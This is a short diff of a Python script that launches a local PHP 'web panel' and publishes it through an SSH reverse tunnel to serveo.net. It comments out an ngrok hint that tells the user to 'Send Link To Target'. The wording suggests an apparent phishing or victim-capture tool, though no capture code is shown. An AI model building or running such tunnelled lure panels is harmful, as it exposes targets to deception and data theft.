@@ -45,7 +45,7 @@ def run_php_server(port):
 
 
     print(Fore.RED+" [+] "+Fore.GREEN+"Web Panel Link : "+Fore.WHITE+f"http://localhost:{port}")
-    print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)
+    # print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+f"Please Run NGROK On Port {port} AND Send Link To Target > "+Fore.YELLOW+Back.BLACK+f"ngrok http {port}\n"+Style.RESET_ALL)
     process = subprocess.Popen(["ssh", "-R", "80:localhost:2525", "serveo.net"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
     for line in process.stdout:
         print(line.decode(), end='')
